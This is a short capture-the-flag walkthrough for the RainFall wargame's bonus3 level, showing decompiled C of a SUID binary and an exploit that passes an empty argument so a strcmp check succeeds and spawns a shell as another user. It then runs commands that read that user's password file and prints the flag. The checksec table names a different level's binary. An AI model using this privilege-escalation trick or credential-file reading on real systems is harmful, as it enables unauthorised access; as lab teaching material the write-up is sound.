When we change to bonus3 user, we're greeted with:

```shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus2/bonus2
```

We find another SUID executable, this time owned by bonus3.

```shell
bonus3@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 end users 5566 Mar  6  2016 bonus3
```

It takes arguements, but only prints an empty line:

```shell
bonus3@RainFall:~$ ./bonus3 asdfasdfasdfasdfsd

bonus3@RainFall:~$
```

The decompiled code loosk as follows:

```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char ptr[132]; // [esp+18h] [ebp-90h] BYREF
  FILE *v5; // [esp+9Ch] [ebp-Ch]

  v5 = fopen("/home/user/end/.pass", "r");
  memset(ptr, 0, sizeof(ptr));
  if ( !v5 || argc != 2 )
    return -1;
  fread(ptr, 1u, 0x42u, v5);
  ptr[65] = 0;
  ptr[atoi(argv[1])] = 0;
  fread(&ptr[66], 1u, 0x41u, v5);
  fclose(v5);
  if ( !strcmp(ptr, argv[1]) )
    execl("/bin/sh", "sh", 0);
  else
    puts(&ptr[66]);
  return 0;
}
```

As we can see here the ``ptr`` is being compared against the value of our first argument. If we provide an empty string it'll equal both to 0 and launch the shell for us.

```shell
bonus3@RainFall:~$ ./bonus3 ""
$ whoami                                                                                                              end
$ cat /home/user/end/.pass
3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
```
